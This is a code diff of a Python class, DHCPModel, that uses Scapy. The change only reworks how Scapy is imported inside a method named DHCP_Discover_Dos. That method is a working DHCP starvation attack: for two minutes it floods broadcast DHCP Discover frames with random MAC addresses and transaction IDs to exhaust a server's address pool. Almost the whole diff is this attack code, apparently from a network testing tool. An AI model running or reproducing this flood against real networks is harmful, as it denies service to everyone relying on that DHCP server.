@@ -1,7 +1,7 @@
 import logging
 import time
 from scapy.config import conf
-from scapy.all import *
+
 
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 
@@ -16,17 +16,17 @@ class DHCPModel:
         conf.checkIpAddr = False
 
     def DHCP_Discover_Dos(self):
-
+        scap = self.env.getImport('scapy.all')
         #scap = self.env.getImport('scapy.all')
         #run this for 2mins after stop
         t_end = time.time() + 60 * 2
         while time.time() < t_end:
             #randomize fields
-            hostname = RandString(12,'0123456789abcdef')
-            m = RandMAC()
-            transid = random.randint(0,0xFFFFFFFF)
+            hostname = scap.RandString(12,'0123456789abcdef')
+            m = scap.RandMAC()
+            transid = scap.random.randint(0,0xFFFFFFFF)
             #craft discover dhcp
-            tramedhcp = Ether(src=m,dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255")/UDP(sport=68,dport=67)/BOOTP(xid=transid,chaddr=hostname)/DHCP(options=[("message-type","discover"),"end"])
+            tramedhcp = scap.Ether(src=m,dst="ff:ff:ff:ff:ff:ff")/scap.IP(src="0.0.0.0",dst="255.255.255.255")/scap.UDP(sport=68,dport=67)/scap.BOOTP(xid=transid,chaddr=hostname)/scap.DHCP(options=[("message-type","discover"),"end"])
 
             #sendq
-            sendp(tramedhcp)
+            scap.sendp(tramedhcp)
